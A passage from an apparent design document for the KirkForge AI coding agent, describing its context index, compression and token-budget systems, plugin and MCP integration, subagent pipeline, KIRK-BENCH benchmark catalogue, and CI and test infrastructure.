own crate-local verify cycle (WO 32.19 R7): `run_correction_loop` scans the
delegation's written files via `kf_orchestrator::verifier::scan_files` (a
port of the same 14 regex rules) and populates
`packet.verification.security` before `decide_correction` runs. The two
copies (binary `security_emitter.rs` + crate `verifier.rs`) are
deliberate: unifying them requires extracting a `kf-security` crate, which
is out of scope for R7 (wiring, not restructuring).

### Correction loop

After a tool execution event, the correction loop (up to 3 iterations):
1. Runs verifiers → gets a `Verdict`.
2. `Clean`/`Skipped` → done.
3. `Fixable` with a `command` → run the formatter command in-place (e.g.
   rustfmt). `Fixable` with `original`/`replacement` → return the suggestion to
   the model as a tool result.
4. `Unfixable` → report to the model.
5. Re-verify after each auto-fix to catch cascading issues.

---

## Context index

`kf-context-index` builds a tree-sitter-backed symbol, import, and
call-graph index. For a given symbol, the agent can retrieve:

- The symbol's definition (file, line, kind)
- Files that import it (`imported_by`)
- Call sites that invoke it (`called_by`)

Four languages: Rust, TypeScript (including tsx), Python, Go. The index is
cached as JSON at `.kf-code/context-index/cache.json`, keyed on git HEAD for
invalidation. This gives the agent graph-grounded context instead of relying on
plain-text search.

The index is built synchronously at session startup for interactive (TUI) runs.
`--non-interactive` skips the build: the tree-sitter walk is unbounded on large
working trees (gap #27) and scripted single-shot runs prioritize startup
latency over symbol enrichment.

Retrieval is hybrid (ADR-037 Phase 7): an exact symbol-name match triggers a
BFS graph walk over the import + call-graph edges (both directions, deduped by
`(file, name)` keeping the minimum hop, capped at 2 hops); a free-text query is
ranked by TF-IDF embedding cosine similarity (pure-Rust sparse vectors over
name + kind tokens, persisted in `CachedIndex`); a substring query falls back to
the original `retrieve()`. The prompt builder calls `retrieve_hybrid` every
turn. Zero new dependencies — the embeddings module is pure Rust over the
existing `serde` / `tree-sitter` / `walkdir` set.

The walker also handles five non-trivial syntax patterns (WO 8.9):

- **TypeScript** `export const foo = () => {}` — arrow function assignments
  extract the LHS identifier as a Function symbol name.
- **TypeScript interface merging** — multiple `interface Foo {}` declarations
  in the same file dedupe to one entry via `ContextIndex::dedup_interfaces()`,
  keyed by `(name, file)`.
- **Python** `if __name__ == "__main__":` — the body of the guard is skipped
  entirely so no spurious module-level symbols are produced.
- **Python decorators** — `@decorator\ndef f(): ...` extracts `f` (the
  decorated child is recursed; the decorator nodes are not).
- **Go method receivers** — `func (s *Server) Start()` and
  `func (r Server) Stop()` are both extracted as `Server.Start` / `Server.Stop`
  (pointer and value receivers are normalized to the base type).

---

## Context compression (Stratum)

Stratum is the **input-side** context cost system. It classifies tool outputs
by content type and compacts bloated payloads *before* they enter the context
window. Four modes: `off`, `lite`, `full`, `ultra`. The pipeline classifies
content and applies size-based truncation with optional offload storage.

// ponytail: MinifyTransform registered (source code minification);
// query-based relevance filtering and additional content-type transforms
// still deferred.
// Upgrade path: query-based relevance scoring, per-content-type stages.

Stratum ships as a compiled-in module (when the `stratum` feature is on,
ADR-046) or as a shell fallback (feature off).
The `session-start` hook emits the active ruleset so the model knows the
compression contract; the `pre-tool-bash` hook validates config to surface
drift early. Both hooks are in-process Rust handlers when compiled in.

Stratum also coordinates with the budget guard (`kf-budget-core`, Workorder 8.6,
ADR-051): when the budget slices a tool result, a registered Stratum listener
compresses the sliced display so the model sees a single coordinated
post-compression size, and the Stratum session mode auto-escalates `Lite →
Full` when the budget is `Approaching`. The coordination is a sync
registered-listener dispatch (not the async `EventBus`) because the slice path
is itself sync.

---

## Token budget (kf-budget-core)

The budget guard is the **output-side** context cost system. It tracks token spend
against a configurable ceiling (default 200K) and intervenes when the budget is
approached or exceeded:

| State | Action |
|---|---|
| `Under` | Allow |
| `Approaching` (≥80% of ceiling) | Warn; auto-escalate Stratum `Lite → Full` (Workorder 8.6) |
| `Over` | Slice the largest recent tool output, or compact if no single slice fits |

The orchestrator (`SlicingOrchestrator`) classifies tool outputs, slices
oversized ones with head/tail markers, and offloads the full content to a store.
Cost reporting tracks per-turn usage. The budget guard ships as a compiled-in module
(when the `budget` feature is on, ADR-047) or as a standalone `kf-budget` binary
(feature off, shell fallback).

The 4 in-process hooks receive full `HookContext` with real tool result content
 and compact metadata — the lossy canned-JSON shim that existed when the budget
 guard ran as a shell plugin is eliminated (ADR-047). The hooks observe and report budget
usage; active slicing of tool results before they enter the conversation shipped
in Workorder 7.1 (`check_and_slice` in `src/session/budget.rs`).

`PreCompactHook` (in `src/session/budget.rs`) escalates the Stratum session
mode to `Full` when a `pre-compact` fires under budget pressure, so the next
tool-result cycle uses more aggressive compression.

---

## Plugin system

Plugins are manifest-based and dynamically loaded at runtime from the
filesystem. The plugin SDK (`kf-plugin-sdk`) and host (`kf-plugin-host`)
are compiled into the binary; plugin *functionality* arrives via one of two
dispatch paths (ADR-050):

1. **Compiled-in** (feature on): tools register as direct Rust calls in
   `main/mod.rs`; hooks register as `InProcessHook` handlers in the executor.
   The shell plugin dir is skipped by the loader, so only the in-process
   version registers — no duplicate tool registrations.
2. **External** (feature off): the shell plugin dir loads via
   `PluginToolWrapper` shell-outs. This is graceful degradation — a user who
   builds without a feature still gets the plugin via the shell plugin if its
   dir and satellite binary are available, at the cost of subprocess overhead.

The folded plugins (Stratum, Budget, kf-plugin) use this two-path
dispatch. A single toggle — `enabled_plugins` in `ToolConfig` — controls both
paths: a folded plugin name enables the compiled-in path (feature on) or the
shell path (feature off). As of WO 15.7 (item 5.1), the runtime toggle also
gates the compiled-in path: when a folded plugin name is absent from
`enabled_plugins`, its tools and in-process hooks are not registered even
when the compile-time feature is on. So `/plugins disable stratum` removes
"stratum" from `enabled_plugins` and the Stratum tools/hooks stay live only
on the next `kf-code run` that re-registers them. `plugin_sources` is only
needed for external/shell plugins. The `kf-plugin` self-plugin is folded
behind the `kf-plugin-tools` feature (WO 29.1): `doctor`, `health`,
`tools`, `verify`, and `audit_verify` run as native Rust calls; `verify`
runs the orchestrator crate's security emitter over the working tree and
`audit_verify` walks the WO 29.4 hash chain over an audit JSONL file
(both WO 35.6); `verify_workspace` still reports "not implemented
(reducer not ported)". The orchestrator's `ModelClient` has a production
impl (`session::executor_adapter::ExecutorAdapter`, WO 35.6 / ADR-075),
though the verify commands are deterministic and do not call it. The
external linters themselves (ESLint, TypeScript,
Ruff, Pyright, Bandit) stay external subprocesses under both paths
(ADR-050). The TS tree (`npm/kf-plugin/`) and shell-plugin tree
(`plugins/kf-plugin/`) were deleted in WO 29.9 — the Rust path is the sole
implementation.

`/plugins list` shows the source (`compiled-in` / `external` /
`external (feature off)`) and feature gate for each workspace plugin source.

### Manifest format (`kf-code.toml`)

```toml
name = "stratum"
version = "0.2.0"
description = "Context compression pipeline"
api_version = "v1"
trust = "shell"

[[capabilities]]
type = "tool"
name = "stratum_run"
description = "Run the compression pipeline"
schema = { ... }
command = "tools/run.sh"

[[capabilities]]
type = "skill"
trigger = "/stratum"
prompt = "..."

[[capabilities]]
type = "hook"
event = "session-start"
command = "hooks/session-start.sh"

[[capabilities]]
type = "verifier"
name = "stratum-config"
priority = 5
```

The host validates every manifest with `PluginManifest::validate()`
before applying the trust policy. The validator collects every rule
violation into a `Vec<ValidationError>` and surfaces them as load
warnings (no rejection — the user sees all issues at once). Rules:
kebab-case `name`; valid semver `version`; `api_version` is `v1`;
capability-specific constraints (tool/hook `command` must be a
relative path, skill `trigger` must start with `/`, hook `event`
must be in the canonical set `session-start` / `pre-turn` /
`post-turn` / `pre-tool-bash` / `post-tool-bash` / `pre-compact` /
`post-compact`, verifier `name` non-empty, tool `schema` is a JSON
object with a valid optional `type` field); and no duplicate skill
triggers / tool names / verifier names within a single manifest.

### Trust tiers

`read-only` < `shell` < `network` < `unsafe`. The host caps plugins at
`max_plugin_trust` (config: default `shell`). Over-tier plugins are rejected or
downgraded. Optional minisign detached-signature verification (`.kf-code.sig`).

### Capability kinds

| Kind | What it does |
|---|---|
| `skill` | A slash command with a templated prompt (model invokes it; the prompt is injected) |
| `tool` | A named tool with a JSON Schema, invoked by the model like a built-in tool (shell command) |
| `hook` | A lifecycle hook script fired on an event |
| `verifier` | A deterministic post-execution check with priority |

### The 3 built-in plugins

| Plugin | Trust | Skills | Tools | Hooks | Source |
|---|---|---|---|---|---|
| `kf-plugin` | shell | `/kf-code` | 6 | 0 | Compiled-in (`kf-plugin-tools` feature) — verify tools stub pending WO 29.7 model client |
| `stratum` | shell | `/stratum` | 5 | 2 | Compiled-in (`stratum` feature) — no shell manifest |
| `kf-budget` | shell | `/budget` | 7 | 4 | Compiled-in (`budget` feature) — no shell manifest |

Runtime toggles: `enabled_plugins` (Vec) and `plugin_sources` (HashMap) in
`ToolConfig`. The `/plugins` TUI command set: `list`, `enable`, `disable`,
`toggle`, `reload`, `trust`, `sources`, `add`, `remove`, `setup`.

### Tool integration strategy: MCP-first

KirkForge has two mechanisms for adding tools:

#### Bespoke plugin system (frozen for new tools)

The manifest-based plugin system (`kf-code.toml`, trust tiers, minisign
signatures, hook veto, verifier integration) is the original extensibility
path. It is **frozen for new tool integrations** — existing plugins continue
to work and are maintained, but new tools should not be added as bespoke
plugins. This system is still the right choice for capabilities that require
deep lifecycle integration (hooks, verifiers, skills, trust gating).

#### MCP (primary path for new tool integrations)

The MCP client (`src/session/mcp_client/`) speaks the Model Context Protocol
over stdio and streamable-HTTP transports. It supports `tools/list` and
`tools/call` — the subset needed to expose any MCP-compatible server as
tools in the agent loop. Tools are prefixed `mcp/<server>/<tool>` and are
resolved alongside built-in tools in `CompositeToolset` (priority: builtin >
MCP > plugin).

MCP is the **default choice** for new tool integrations because it is a
standard protocol: any MCP server works without custom plugin manifests,
trust-tier wiring, or minisign signatures. Servers that advertise
unsupported capabilities (`resources`, `prompts`, `sampling`, `roots`) are
logged as warnings at startup.

#### When to use which

| Need | Use |
|---|---|
| Expose a new tool to the agent | MCP server (stdio or HTTP) |
| Lifecycle hooks (pre/post-tool, session events) | Bespoke plugin |
| Verification checks in the bus | Bespoke plugin |
| Slash-command skills with templated prompts | Bespoke plugin |
| Trust-tier gating on untrusted code | Bespoke plugin |

Both systems coexist. MCP does not replace hooks, verifiers, or skills —
it replaces the `tool` capability kind for new tools. Existing bespoke
plugins that expose tools continue to work unchanged.

---

## Specialized runtimes

### Workflow engine

`kf-workflow` is a programmable JSON workflow engine. Workflows are DAGs
of persona-driven steps (`explore`, `plan`, `coder`) with optional critique
passes. Three built-in templates ship: `bugfix`, `feature`, `refactor`.
Workflows reuse the `task` tool's in-process spawner, so they run as orchestrated
subagent personas within a single session. Workflows are invoked two ways: the
TUI `/workflow run` slash command, and the `workflow_run` tool (WO 9.1) which
lets the agent loop and bench harness run a named template via a tool call.

### Scout→coder→reviewer pipeline (WO 32.5; pipeline semantics WO 35.1)

`ParallelOrchestrator` (`src/session/parallel_orchestrator.rs`) runs three
subagents as a real pipeline, not a fan-out: the Scout (`explore` persona,
read-only) completes first and its context summary is injected into the
Coder's prompt; the Coder (`coder` persona, write, own worktree when
`session.worktree_enabled` per WO 35.2) returns a change summary plus an
appliable diff patch, which is injected into the Reviewer's prompt; the
Reviewer (`plan` persona, read-only) critiques the Coder's actual changes
(not the task blurb) and ends with "## Review Complete". The extracted patch
is exposed on `ParallelResult.coder_patch`. `run_parallel` and
`run_sequential` are the same pipeline since WO 35.1 — the entry point
selected by `/workflow run <name> --parallel` reflects whether worktree
isolation is enabled, not ordering. Each role registers a `TaskManager`
entry (internal cancel bookkeeping, not rendered by `/jobs`) with the
WO 35.3 cancel pair (flag + token) threaded into its `TaskRequest`, so
`ParallelOrchestrator::cancel_all()` stops in-flight roles cooperatively
(each runs cleanup, captures any worktree patch, and returns). The
orchestrator holds one injectable `Arc<dyn TaskSpawner>` — the
`InProcessTaskSpawner` seam, so no new executor construction, inheriting
WO 32.4 landlock/CWD confinement and WO 30.6 approval forwarding. Since
WO 35.1 the `TaskSpawner` contract is prompt-verbatim: callers apply persona
preambles via `build_task_prompt` (`tools::task`) or pass their own role
prompt — one wrapper, never two.

### Orchestrator ModelClient wiring (WO 35.6, ADR-075)

`kf-orchestrator`'s `ModelClient` trait has a production implementation in
the binary: `session::executor_adapter::ExecutorAdapter`. Each
`TaskBrief` is mapped onto an isolated subagent session through
`InProcessTaskSpawner::run_task_detailed` (the `task` tool's path, plus
summed `CostStats` usage and a derived finish reason): `content` is the
final assistant message, `format` echoes the brief's template, and
persona selection maps `task-decompose` → `plan` (read-only) and the
three writer modes → `coder` (ADR-075 documents the flattening and the
rejected session-variant). The adapter has no production caller yet —
reimplementing `ParallelOrchestrator` on `kf-orchestrator::Orchestrator`
is a follow-up decision; the `EventSink` → binary event-bus bridge and
the reducer port are separately tracked follow-ups.

---

## Benchmarks (KIRK-BENCH)

The benchmark system measures agent capability on coding tasks. The spec
defines eight categories (A–H), 40 numbered tasks, one universal scoring
format, 10 hero benchmarks, and one signature challenge — the **Token Budget
Challenge** (WO 14.7, ADR-0066).

### Categories

- **A — Repository Understanding** (5 tasks): Find Dead Code, Dependency
  Graph Accuracy, Call Graph Generation, Explain Module, Cross-Repository
  Search. *Metrics: precision, false positives, runtime.*
- **B — Refactoring** (5 tasks): Rename Public API, Extract Trait, Extract
  Module, Split Giant File, Remove Duplication.
- **C — Bug Fixes** (6 tasks): Fix Compilation Error, Fix Clippy Lints, Fix
  Unit Test, Fix Integration Test, Fix Panic, Resolve Borrow Checker Error.
- **D — New Features** (5 tasks): Add CLI Flag, Add REST Endpoint, Add Config
  Option, Implement Missing Trait, Implement TODO Stub.
- **E — Verification** (5 tasks): Build Verification, Formatter Verification,
  Lint Verification, Test Verification, Self Repair. *These are the
  differentiators.*
- **F — Context Intelligence** (4 tasks): Large Repository Navigation, Semantic
  Retrieval, Context Compression, Budget Enforcement.
- **G — Real Engineering** (5 tasks): Multi-file Feature, Large Refactor,
  Merge Conflict Resolution, PR Review, Regression Detection.
- **H — Cost** (5 tasks): Token Efficiency, Dollar Cost, Time, Retry Count,
  Human Intervention.

### Universal scoring

Every benchmark emits the same metrics block:

```
Benchmark:          Rename Public API
Success:            PASS
Compilation:        PASS
Tests:              PASS
Lint:               PASS
Verification:       PASS
Retries:            1
Elapsed:            19.4 s
Input Tokens:       8,412
Output Tokens:      1,153
Compression Ratio:  63%
Budget Violations:  0
Provider:           GPT-5
Cost:               £0.12
```

### Hero benchmarks

The 10 hero benchmarks are the public scoreboard:

1. Fix failing Rust build
2. Rename API across workspace
3. Implement missing feature
4. Resolve merge conflicts
5. Refactor 100-file workspace
6. Explain unfamiliar codebase
7. Reduce token usage on a large repository
8. Review a pull request and identify defects
9. Recover automatically from a failed verification step
10. Complete an end-to-end feature (implementation, tests, docs, verification)

### Task TOML format

Each task file in `benches/tasks/` is a TOML file:

```toml
name = "fix_clippy_naming"
difficulty = "easy"
category = "C"            # A–H, matching the spec categories
requires_model = false    # true = skipped by bench verify-only

[setup]
"Cargo.toml" = """..."""

[verify]
type = "command_exits_zero"
command = "grep -q 'pub fn first' src/lib.rs"
```

The `category` field enables automated reporting by category. Tasks without a
`category` field are reported under "Uncategorised".

### Implemented task mapping (30 tasks)

30 implemented tasks cover 18 of the 40 spec slots. 10 hero benchmarks
cross-check the highest-value categories. 1 task (`use_draw_render`) was
removed when the draw plugin was deleted; it is no longer in the task set.

| Existing task | Spec task(s) | Category | Coverage |
|---|---|---|---|
| `add_cli_flag.toml` | 17 Add CLI Flag | D | full |
| `add_doc_comment.toml` | 21 Implement TODO Stub | D | partial |
| `add_enum_variant.toml` | 17 Add CLI Flag | D | partial |
| `add_error_handling.toml` | 15 Fix Panic | C | partial |
| `add_error_variant.toml` | 19 Add Config Option | D | partial |
| `add_struct_field.toml` | 19 Add Config Option | D | partial |
| `add_test_for_function.toml` | 25 Test Verification | E | partial |
| `add_test_module.toml` | 25 Test Verification | E | partial |
| `add_adr.toml` | 21 Implement TODO Stub | D | partial |
| `debug_log_trace.toml` | 15 Fix Panic | C | full |
| `extract_module.toml` | 8 Extract Module | B | full |
| `extract_trait.toml` | 7 Extract Trait | B | full |
| `fix_borrow_error.toml` | 16 Resolve Borrow Checker Error | C | full |
| `fix_clippy_naming.toml` | 12 Fix Clippy Lints | C | full |
| `fix_clippy_warning.toml` | 12 Fix Clippy Lints | C | full |
| `fix_failing_test.toml` | 13 Fix Unit Test | C | full |
| `fix_lifetime_error.toml` | 16 Resolve Borrow Checker Error | C | partial |
| `inline_function.toml` | 10 Remove Duplication | B | partial |
| `multi_file_pattern.toml` | 31 Multi-file Feature | G | full |
| `pr_review.toml` | 34 PR Review | G | full |
| `refactor_extract_function.toml` | 10 Remove Duplication | B | full |
| `refactor_trait_extraction_multi.toml` | 7 Extract Trait | B | full |
| `rename_function.toml` | 6 Rename Public API | B | full |
| `rename_module.toml` | 6 Rename Public API | B | partial |
| `test_fix_cycle.toml` | 26 Self Repair | E | full |
| `use_budget_check.toml` | 30 Budget Enforcement | F | partial |
| `use_lsp_query.toml` | 28 Semantic Retrieval | F | partial |
| `use_stratum_compress.toml` | 29 Context Compression | F | full |
| `use_workflow_run.toml` | 31 Multi-file Feature | G | partial |
| `token_budget_challenge.toml` | 30 Budget Enforcement | F | full (signature) |

### Planned tasks (honest deferral)

18 spec tasks are not yet implemented. Each exercises a specific feature
and is a future workorder.

| Spec task | Category | Exercises |
|---|---|---|
| 1 Find Dead Code | A | tree-sitter symbol graph + unreferenced-symbol query |
| 2 Dependency Graph Accuracy | A | crate-level dep graph generation |
| 3 Call Graph Generation | A | per-symbol call graph |
| 4 Explain Module | A | module summarisation without hallucination |
| 5 Cross-Repository Search | A | trait-impl search across workspace |
| 9 Split Giant File | B | 2500-line file split |
| 18 Add REST Endpoint | D | non-Rust task setup |
| 22 Build Verification | E | standalone build-verify task |
| 23 Formatter Verification | E | standalone fmt-verify task |
| 24 Lint Verification | E | standalone lint-verify task |
| 27 Large Repository Navigation | F | context index at Linux-scale |
| 32 Large Refactor | G | 50+ files |
| 33 Merge Conflict Resolution | G | realistic conflict resolution |
| 35 Regression Detection | G | PR regression prediction |
| 36 Token Efficiency | H | standalone token-efficiency task |
| 37 Dollar Cost | H | standalone cost task |
| 38 Time | H | standalone latency task |
| 39 Retry Count | H | standalone retry-count task |
| 40 Human Intervention | H | standalone intervention task |

3 spec tasks (Fix Compilation Error, Fix Integration Test, Implement Missing
Trait) have no mapping yet — a known gap.

The harness (`kf-bench` crate + `src/session/bench.rs`) spins up a
headless agent session with a real model adapter, auto-approves all tool calls,
runs the task, then verifies the result deterministically. Reports are written as
JSON and markdown.

### Token Budget Challenge (WO 14.7, ADR-0066)

The signature benchmark. It runs the same task 5× under descending context
budgets (128k → 64k → 32k → 16k → 8k) and records six metrics per ceiling:
success, prompt tokens, completion tokens, compression passes, cost. This
showcases the tree-sitter context index, Stratum compression, and the budget
budget guard under progressively tighter budgets — the architectural
differentiator vs Claude Code / Vix / opencode.

- **Task**: `benches/tasks/token_budget_challenge.toml` — a small Rust crate
  with a failing test the model must fix (wire a `--verbose` flag into a stub
  parser). `requires_model = true` so `bench verify-only` skips it.
- **Runner**: `run_token_budget_challenge` in `src/session/bench.rs` runs the
  task once per ceiling in `BUDGET_CHALLENGE_CEILINGS = [131_072, 65_536,
  32_768, 16_384, 8_192]`. Each run clones the task with `budget_ceiling` set;
  the runner exports `KF_CODE_BUDGET_CEILING=<n>` to the agent's env so the
  budget guard enforces it for that run, then clears it after. `run_all`
  dispatches on the task name (`token_budget_challenge`) to the loop instead
  of the single-run path.
- **Report**: `BudgetChallengeReport` (in `kf-bench`) records the six
  metrics per ceiling; `write_budget_challenge_report` emits the markdown
  scoreboard table (ceiling × success × prompt tokens × completion tokens ×
  compression passes × cost). `TaskResult` gained a serde-optional
  `compression_passes` field (counts `TurnEvent::CompactionReport`) for this.
- **Budget env wiring**: `BenchTask::budget_ceiling: Option<usize>`
  (serde-optional, default `None`) is the task-side field. The
  `KF_CODE_BUDGET_CEILING` env hook in `env_overrides.rs` (mirrors
  `KF_CODE_MINIFY_ABOVE_BYTES` from WO 9.7) reads it into
  `cfg.tools.budget_ceiling`; `init_from_config` applies it to the shared
  `TokenBudget`. No new budget code — reuses ADR-0005 / WO 7.5 / WO 8.6.

A `bench` workflow runs all tasks on Ollama with `qwen2.5:0.5b` on push to main.
It posts a delta summary as a PR comment comparing against the `main` baseline
(ADR-045). The bench-baseline workflow file was deleted in the CI
architecture reset (ADR-074) as an obsolete artifact.

### Bench CI loop (WO 10.9) — *deleted* (ADR-074 CI reset)

The bench CI loop was previously a disabled workflow file (deleted in
ADR-074 CI reset). The design was:

1. **`bench-baseline`** (push to main): runs `bench run` with
   `qwen2.5:0.5b`, uploads the report as a 90-day-retention artifact.
   This is the baseline the PR-delta job compares against.
2. **`bench-pr-delta`** (pull request): runs `bench run` on the PR
   HEAD, downloads the latest main-branch baseline, computes the delta
   with `bench compare --fail-on-regression 10`, posts the delta as a
   PR comment, and **fails the job** if the success rate dropped by
   more than 10 percentage points (the regression gate, WO 10.9). The
   comment still posts via `if: always()` so the operator sees the
   numbers even when the gate fails.
3. **`bench-leaderboard`** (scheduled, daily): runs `bench run-models
   --models qwen2.5:0.5b,llama3.2:1b`, writes
   `docs/bench/leaderboard.md`, and commits it to `main` via
   `stefanzweifel/git-auto-commit-action` with `[skip ci]` in the
   commit message. The push trigger also has `paths-ignore:
   ['docs/bench/**']` (expressed as `!docs/bench/**` in the paths
   list) so the leaderboard commit does not re-trigger the bench
   workflow (belt-and-suspenders loop avoidance).

The `bench compare --fail-on-regression <pct>` CLI flag (WO 10.9) uses
`compare_with_threshold(baseline, current, threshold)` in the
`kf-bench` crate. The threshold is a fraction (0.10 = 10
percentage points); the CLI flag takes a percentage (10). The
regression is detected when `success_rate_delta < -threshold` (strict
inequality: a drop of exactly the threshold is not a regression).

The PR-delta job is single-model (`qwen2.5:0.5b` only) because the
second `ollama pull` adds 2-5 minutes per model and the PR job is
latency-sensitive. The scheduled leaderboard covers multi-model
comparison.

### Coverage gate (WO 12.9, ADR-065; per-crate regression gate WO 28.7)

The CI `coverage` job runs in `ci-nightly.yml` only (per ADR-074 reset —
was in the old monolithic workflow pre-split, then in ci-merge.yml
pre-reset). It runs `cargo llvm-cov --workspace --lcov
--output-path lcov.info` and uploads `lcov.info` as an artifact.
`scripts/check-cov-regression.sh` (WO 28.7) parses that lcov per-crate
(by source-path prefix) and fails if any crate drops >1% below its floor
in `docs/coverage-baseline.md`. Current floors (measured 2026-08-13):
`kf-code` 78.4%, `kf-budget-core` 86.5%, `kf-testdoctor` 71.2%,
`kf-compress-core` 95.2%, `kf-plugin-host` 88.8%, `kf-bench` 88.3%. The
local `ci-local.sh full` runs the same gate; a separate per-directory
tarpaulin gate (`src/session` 68.5%, `src/tools` 76.0%, `src/adapters`
75.0%) is drift-guarded by the kf-testdoctor `default_thresholds_match_local_gate`
test. The gate is a regression guard, not a vanity number — the -1%
tolerance absorbs run-to-run llvm-cov variance.

### Non-Rust linting (WO 26.6-R3)

The Rust workspace is linted with `cargo clippy`. The TS tree that used to
live under `npm/kf-plugin/` (ESLint) was deleted in WO 29.9 when the TS→Rust
migration completed; there is no in-tree JavaScript to lint. No Python source
is linted in-tree; the only `.py` files are test fixtures and a release
script, so `ruff` is not wired.

### CI workflows (2026-08-15 split, ADR-074 reset)

The monolithic CI workflow was split into three trigger-scoped files
(WO 33.3) and then reset per ADR-074 (WO 33.x). The reset removed the
artificial `needs:` chain in ci-merge (all merge jobs are now parallel
siblings depending on `static` only), moved Ollama integration tests +
coverage to nightly-only, replaced inline `--config` nextest flags with
declarative `--profile` (`ci-full` for windows, `e2e` for e2e), scoped
clippy (PR `--lib --bins`, merge `--all-targets`), renamed the `fmt` job
→ `static` (it does conflict markers + TOML schema + artifact
consistency + rustfmt), and stripped WO-incident comments (historical
rationale moved to ADR-074). CI references below should read as the new
files:

| File | Trigger | Jobs | Target |
|---|---|---|---|
| `.github/workflows/ci-pr.yml` | `pull_request` | `static`, `changes` (path-aware, WO 33.6), `clippy` (`--lib --bins`), `fast-tests` (nextest `ci-fast`), `dead-refs`, `adr-xref` | <5 min PR gate, fail-fast + concurrency cancellation |
| `.github/workflows/ci-merge.yml` | `push` to `main`/`dev` | `static` → parallel `{clippy` (`--all-targets`), `full-tests` (nextest `ci-full`), `windows` (nextest `ci-full`), `e2e` (nextest `e2e`, `--features e2e-tests`)}` | pre-merge gate; no Ollama, no coverage (both nightly-only per ADR-074) |
| `.github/workflows/ci-nightly.yml` | `schedule` + `workflow_dispatch` | `coverage` (full llvm-cov + `check-cov-regression.sh`), `ollama` (live model integration), `audit`, `release-build` matrix | nightly depth + slow jobs that don't belong on PRs |

The `static` job (renamed from `fmt` in ADR-074) runs conflict-marker
detection, TOML schema validation, `scripts/check-artifact-consistency.sh`
(dead crate/binary refs, WO 28.12), and `cargo fmt --check`. Coverage
gate (`scripts/check-cov-regression.sh`, WO 28.7) now runs in
`ci-nightly.yml` only (was in ci-merge.yml pre-ADR-074). The PR `clippy`
gate is `--lib --bins` (was `--all-targets`) for faster feedback; the
merge job still runs `--all-targets`.

### Nextest profiles (WO 33.5)

`.config/nextest.toml` defines four profiles so CI doesn't inline `--config`
flags:

| Profile | Scope | Used by |
|---|---|---|
| `ci-fast` | lib + bins, no integration/e2e | `ci-pr.yml` `fast-tests` |
| `ci-full` | whole workspace, no e2e/integration | `ci-merge.yml` `full-tests` + `windows` |
| `integration` | integration tests (needs live Ollama) | `ci-nightly.yml` `ollama` (per ADR-074 — was in ci-merge pre-reset) |
| `e2e` | binary-spawn e2e suite (feature-gated `e2e-tests`) | `ci-merge.yml` `e2e` + `ci-nightly.yml` `e2e-exhaustive` |

Invoke locally: `cargo nextest run --profile ci-fast`.

### Path-aware changed-package selection (WO 33.6)

`scripts/changed-packages.sh` maps `git diff --name-only <base>..HEAD` to
affected cargo packages including reverse-dep closure (4 internal edges,
hardcoded adjacency table — `ponytail:` ceiling documented in script).
`ci-pr.yml` runs a `changes` job that gates `clippy` + `fast-tests` on
the output; docs-only / non-Rust changes emit `__NO_RUST_CHANGES__` and
skip Rust CI entirely.

### Test-tier improvements (WO 33.12-33.16, kf-rbac)

Three test-tier hardening items shipped in the WO 33 series:

- **Phase 1 sleep elimination (WO 33.12):** killed remaining wall-clock
  sleeps in tests — replaced with event-driven synchronization (poll
  helpers, `yield_now`, readiness probes). 9 files touched; genuine
  timeout tests kept as-is.
- **Phase 2 env-mutation elimination (WO 33.13/33.16):** replaced every
  raw `std::env::set_var`/`remove_var` in test code with the `EnvGuard`
  RAII helper (`src/shared/test_util.rs`) that restores the prior value
  on Drop, making parallel `#[test]` execution safe without
  `#[serial]`. 18 files touched; widened `EnvGuard::set` to
  `impl AsRef<OsStr>`. Zero raw env mutations remain in test bodies.
- **kf-rbac JWT test speedup:** injected a `JwksResolver` trait
  (`crates/kf-rbac/src/jwt.rs`) so the JWKS fetch is the only network
  step in `verify_jwt` and tests can inject an in-memory fake.
  Production keeps `HttpJwksResolver` (wraps the existing OIDC-discovery
  + reqwest path verbatim; no behaviour change). The 8 slow JWT tests
  dropped from 690.8s total to <0.5s total. Root cause was RSA-2048
  keygen per nextest process + real HTTP to an unreachable host;
  replaced with precomputed RSA keypair consts + a `FailingJwksResolver`
  fake.

### `kf-code update` subcommand (WO 33.17)

`kf-code update` self-updates the binary: downloads the latest GitHub
release, verifies the SHA256 checksum against the release `SHA256SUMS.txt`,
extracts the `kf-code` binary, and replaces the running binary in place via
an atomic rename. `kf-code update --check` prints current vs latest version
without installing. Target-triple detection mirrors `scripts/install.sh`
(linux x86_64/aarch64, macOS x86_64/aarch64). Uses only existing deps
(reqwest, sha2, hex, tempfile); extraction shells out to `tar` (present on
every Linux/macOS) to avoid pulling `flate2`+`tar` crates into the
size-optimized release binary. Windows is not supported (running binary is
locked) — matches `install.sh`'s stance.

### LSP disabled in editor config (2026-08-15)

The opencode `lsp: true` config entry in `~/.config/opencode/opencode.jsonc`
was flipped to `false` after it caused worktree data loss. rust-analyzer
indexes one workspace per process, so the main checkout's LSP server
returned stale cross-workspace diagnostics for files a linked git worktree
had changed; subagents that trusted those stale diagnostics reverted files
to "fix" them, destroying other subagents' work. This is a local-config
change to the *editor-embedded* LSP, not a change to the in-repo `kf-lsp`
crate or the model-facing `lsp_query` tool (both unchanged and still
shipped). See AGENTS.md §7 "LSP diagnostics are workspace-scoped" for the
full rationale.

---

## Feature flags

The root `Cargo.toml` exposes these features:

- `stratum` (default) — folds the Stratum context-compression plugin in as
  direct Rust calls (ADR-046).
- `budget` (default) — folds the token-budget guard in as direct
   Rust calls with full in-process event context (ADR-047).
- `kf-plugin-tools` (default) — registers the six `kf-plugin` tools as
  compiled-in Rust impls (WO 29.1). `doctor`/`health`/`tools` run natively;
  `verify` (security emitter) and `audit_verify` (hash-chain walker) also run
  natively since WO 35.6; `verify_workspace` reports "not implemented
  (reducer not ported)". With the feature off, no `kf-plugin` tools are
  registered — the shell/Node fallback that lived under
  `plugins/kf-plugin/` was deleted in WO 29.9.
- `pty` (non-default) — PTY-backed interactive bash commands via `portable-pty`
  (WO 21.5-R2; opt in via `--features pty`).
- `computer_use` (non-default) — Anthropic hosted computer_use beta
  (coordinate-vision model). Adapter wire format: serializes a `computer`
  tool as `{"type":"computer_20250124",...}`, sends the
  `anthropic-beta: computer-use-2025-01-24` header, and parses
  `computer_tool_result` content blocks (WO 28.16 R1–R3). The vision
  execution loop (R4 — screenshot capture + coordinate-action routing)
  shipped in WO 32.17: `ComputerUseConfig.hosted` flag (env
  `KF_CODE_COMPUTER_USE_HOSTED`, TOML `[computer_use].hosted`) activates
  the hosted tool; `computer_use.rs` splits into `local_def()` /
  `hosted_def()` and dispatches to `run_hosted_action()` which translates
  Anthropic's action vocabulary to CDP + always captures a screenshot for
  the next model turn. Opt in via `--features computer_use`; default OFF
